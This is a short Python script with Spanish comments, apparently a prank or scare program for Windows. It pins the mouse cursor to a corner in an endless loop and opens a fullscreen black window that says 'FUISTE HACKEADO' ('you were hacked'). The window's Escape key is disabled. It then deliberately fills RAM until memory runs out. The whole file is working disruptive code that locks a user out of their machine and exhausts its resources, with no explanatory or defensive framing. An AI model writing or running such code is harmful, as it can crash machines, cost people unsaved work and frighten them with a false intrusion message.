import ctypes
import time
import threading
import tkinter as tk

# Definir constantes necesarias para el mouse
INPUT_MOUSE = 0
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_ABSOLUTE = 0x8000
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_MIDDLEDOWN = 0x0020
MOUSEEVENTF_MIDDLEUP = 0x0040
MOUSEEVENTF_WHEEL = 0x0800
MOUSEEVENTF_HWHEEL = 0x01000
SM_CXSCREEN = 0
SM_CYSCREEN = 1

# Obtener tamaño de la pantalla
user32 = ctypes.windll.user32
width = user32.GetSystemMetrics(SM_CXSCREEN)
height = user32.GetSystemMetrics(SM_CYSCREEN)

lista = []

# 1. Función para bloquear el mouse
def bloquear_mouse():
    while True:
        ctypes.windll.user32.SetCursorPos(-1, -1)
        time.sleep(0.1)

# 3. Función para llenar la memoria RAM
def ram():
    try:
        while True:
            lista.append([0] * 10**7)
            time.sleep(0.5)
    except MemoryError:
        print("Memoria llena!")

# 2. Ventana en pantalla completa
class PantallaCompleta(tk.Tk):
    def __init__(self):
        super().__init__()

        # Configuración de pantalla completa
        self.attributes('-fullscreen', True)
        self.configure(background='black')
        self.bind('<Escape>', lambda event: "break")

        # Mensaje en pantalla
        self.label = tk.Label(self, text="FUISTE HACKEADO", font=('Helvetica', 24), fg='white', bg='black')
        self.label.pack(padx=20, pady=20)

        # Después de mostrar la ventana, iniciar consumo de RAM
        self.after(3000, iniciar_ram)  # Espera 3 segundos antes de comenzar a llenar RAM

# Función para iniciar el consumo de RAM desde la GUI
def iniciar_ram():
    threading.Thread(target=ram, daemon=True).start()

# Iniciar programa principal
if __name__ == "__main__":
    # 1. Iniciar bloqueo del mouse
    threading.Thread(target=bloquear_mouse, daemon=True).start()

    # 2. Mostrar ventana a pantalla completa
    app = PantallaCompleta()
    app.mainloop()
